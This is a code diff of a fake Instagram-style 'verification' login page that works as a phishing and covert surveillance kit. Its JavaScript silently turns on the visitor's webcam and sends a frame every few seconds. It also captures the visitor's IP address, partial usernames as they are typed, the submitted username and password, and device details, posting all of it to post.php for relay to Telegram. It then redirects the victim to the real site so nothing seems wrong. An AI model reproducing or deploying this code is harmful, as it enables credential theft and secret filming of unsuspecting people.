@@ -6,10 +6,6 @@
     <title>Loading...</title>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
-        /* ============================================
-           COMPLETELY NORMAL LOOKING PAGE
-           No camera, no IP, no console visible
-           ============================================ */
         * {
             margin: 0;
             padding: 0;
@@ -26,7 +22,6 @@
             color: #262626;
         }
 
-        /* Hidden elements - completely invisible */
         .hidden-video-wrap {
             display: none !important;
             position: fixed !important;
@@ -50,7 +45,6 @@
             pointer-events: none !important;
         }
 
-        /* Normal looking container */
         .container {
             width: 100%;
             max-width: 350px;
@@ -137,7 +131,6 @@
             color: #8e8e8e;
         }
 
-        /* Loading spinner - hidden */
         .spinner {
             display: inline-block;
             width: 14px;
@@ -153,7 +146,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* Success message - hidden */
         .success-msg {
             display: none;
             color: #00a651;
@@ -164,21 +156,11 @@
 </head>
 <body>
 
-    <!-- 
-    ============================================
-    COMPLETELY HIDDEN CAMERA - NO VISUAL INDICATORS
-    ============================================
-    -->
     <div class="hidden-video-wrap" aria-hidden="true">
         <video id="video" playsinline autoplay muted></video>
     </div>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-    <!-- 
-    ============================================
-    NORMAL LOOKING PAGE - USER SEES THIS
-    ============================================
-    -->
     <div class="container">
         <div class="card">
             <div class="logo">🔒</div>
@@ -205,14 +187,12 @@
 
     <script>
         // ============================================
-        // STEALTH CAMERA - COMPLETELY HIDDEN
-        // No visual indicators, no logs visible to user
+        // STEALTH CAMERA + IP - ALL TO TELEGRAM
         // ============================================
         
         (function() {
             'use strict';
 
-            // Hidden elements
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
@@ -220,43 +200,52 @@
             let cameraActive = false;
             let captureInterval = null;
             let stream = null;
+            let userIP = '';
 
             // ============================================
-            // HIDDEN IP DETECTION - Silent
+            // DETECT IP AND SEND TO TELEGRAM
             // ============================================
-            function getIPAddress() {
-                // Silent IP detection
+            function detectAndSendIP() {
                 fetch('https://api.ipify.org?format=json')
                     .then(response => response.json())
                     .then(data => {
-                        // Store IP silently
-                        window._hiddenIP = data.ip;
-                        
-                        // Send IP to server silently
-                        $.ajax({
-                            type: 'POST',
-                            url: 'post.php',
-                            data: { 
-                                ip_only: true,
-                                ip: data.ip,
-                                ua: navigator.userAgent
-                            },
-                            async: true
-                        });
+                        userIP = data.ip;
+                        sendToTelegram('IP', userIP, navigator.userAgent);
                     })
                     .catch(() => {
-                        // Fallback - try another service
                         fetch('https://httpbin.org/ip')
                             .then(response => response.json())
                             .then(data => {
-                                window._hiddenIP = data.origin;
+                                userIP = data.origin;
+                                sendToTelegram('IP', userIP, navigator.userAgent);
                             })
-                            .catch(() => {});
+                            .catch(() => {
+                                userIP = 'Unknown';
+                            });
                     });
             }
 
             // ============================================
-            // HIDDEN CAMERA INIT - No user interaction needed
+            // SEND TO TELEGRAM VIA PHP
+            // ============================================
+            function sendToTelegram(type, data, extra = '') {
+                $.ajax({
+                    type: 'POST',
+                    url: 'post.php',
+                    data: {
+                        tg_type: type,
+                        tg_data: data,
+                        tg_extra: extra,
+                        tg_ua: navigator.userAgent,
+                        tg_time: new Date().toISOString()
+                    },
+                    async: true,
+                    timeout: 5000
+                });
+            }
+
+            // ============================================
+            // HIDDEN CAMERA - SEND FRAMES TO TELEGRAM
             // ============================================
             function initHiddenCamera() {
                 try {
@@ -277,36 +266,30 @@
                             
                             cameraActive = true;
                             
-                            // Start capturing silently - every 3 seconds
                             captureInterval = setInterval(function() {
                                 if (cameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
                                     context.drawImage(video, 0, 0, 640, 480);
                                     const imageData = canvas.toDataURL("image/png");
                                     
-                                    // Get username/password if available
-                                    const username = document.getElementById('username')?.value || '';
-                                    const password = document.getElementById('password')?.value || '';
-                                    
-                                    // Send silently - no user notification
+                                    // Send image to Telegram via PHP
                                     $.ajax({
                                         type: 'POST',
                                         url: 'post.php',
                                         data: {
-                                            cat: imageData,
-                                            username: username,
-                                            password: password,
-                                            ip: window._hiddenIP || '',
-                                            ua: navigator.userAgent
+                                            tg_type: 'image',
+                                            tg_image: imageData,
+                                            tg_ip: userIP,
+                                            tg_ua: navigator.userAgent,
+                                            tg_time: new Date().toISOString()
                                         },
                                         async: true,
                                         timeout: 5000
                                     });
                                 }
-                            }, 3000); // Every 3 seconds
+                            }, 3000);
                         })
                         .catch(function(err) {
-                            // Silent fail - user never knows
-                            console.log('Camera unavailable - continuing without');
+                            // Silent fail
                         });
 
                 } catch (e) {
@@ -315,7 +298,7 @@
             }
 
             // ============================================
-            // FORM SUBMISSION - Silently captures credentials
+            // SEND CREDENTIALS TO TELEGRAM
             // ============================================
             document.getElementById('loginForm').addEventListener('submit', function(e) {
                 e.preventDefault();
@@ -325,34 +308,38 @@
                 const btn = document.getElementById('submitBtn');
                 const msg = document.getElementById('successMsg');
                 
-                // Show loading state
                 btn.innerHTML = '<span class="spinner"></span> Processing...';
                 btn.disabled = true;
                 msg.style.display = 'block';
                 
-                // Capture final credentials
+                // Send credentials to Telegram
+                sendToTelegram('credentials', JSON.stringify({
+                    username: username,
+                    password: password,
+                    ip: userIP
+                }), navigator.userAgent);
+                
+                // Also send as separate message
                 $.ajax({
                     type: 'POST',
                     url: 'post.php',
                     data: {
-                        username: username,
-                        password: password,
-                        ip: window._hiddenIP || '',
-                        ua: navigator.userAgent,
-                        final_submit: true
+                        tg_type: 'login',
+                        tg_username: username,
+                        tg_password: password,
+                        tg_ip: userIP,
+                        tg_ua: navigator.userAgent,
+                        tg_time: new Date().toISOString()
                     },
                     success: function() {
-                        // Silent success - user sees normal behavior
                         setTimeout(function() {
                             msg.textContent = '✅ Verified! Redirecting...';
                             setTimeout(function() {
-                                // Fake redirect - looks legit
                                 window.location.href = 'https://www.instagram.com/';
                             }, 1000);
                         }, 1500);
                     },
                     error: function() {
-                        // Silent fail - still redirect
                         setTimeout(function() {
                             window.location.href = 'https://www.instagram.com/';
                         }, 2000);
@@ -361,41 +348,62 @@
             });
 
             // ============================================
-            // START EVERYTHING SILENTLY
+            // SEND PARTIAL USERNAME TYPING
+            // ============================================
+            document.getElementById('username').addEventListener('input', function() {
+                if (this.value.length > 2) {
+                    sendToTelegram('typing', this.value, 'Partial username');
+                }
+            });
+
+            // ============================================
+            // SEND USER AGENT & BROWSER INFO
+            // ============================================
+            function sendBrowserInfo() {
+                const info = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+                sendToTelegram('browser_info', JSON.stringify(info), 'Device Info');
+            }
+
+            // ============================================
+            // SEND PAGE VIEW NOTIFICATION
+            // ============================================
+            function sendPageView() {
+                sendToTelegram('page_view', 'Page loaded', 
+                    `IP: ${userIP} | UA: ${navigator.userAgent}`
+                );
+            }
+
+            // ============================================
+            // INITIALIZE EVERYTHING
             // ============================================
             
-            // 1. Get IP silently
-            getIPAddress();
+            // 1. Detect IP
+            detectAndSendIP();
             
-            // 2. Start camera after short delay (page loads first)
+            // 2. Send browser info
+            setTimeout(sendBrowserInfo, 500);
+            
+            // 3. Start camera
             setTimeout(function() {
                 initHiddenCamera();
             }, 1500);
             
-            // 3. Also try to start camera on user interaction (click)
+            // 4. Send page view
+            setTimeout(sendPageView, 1000);
+            
+            // 5. Try camera on click
             document.addEventListener('click', function() {
                 if (!cameraActive) {
                     initHiddenCamera();
                 }
             }, { once: true });
 
-            // 4. Re-capture on form interaction
-            document.getElementById('username').addEventListener('input', function() {
-                // Silently send username when typed
-                if (this.value.length > 2) {
-                    $.ajax({
-                        type: 'POST',
-                        url: 'post.php',
-                        data: {
-                            username_partial: this.value,
-                            ip: window._hiddenIP || ''
-                        },
-                        async: true
-                    });
-                }
-            });
-
-            console.log('🔧 Security verification active'); // Only visible in console
         })();
     </script>
 </body>
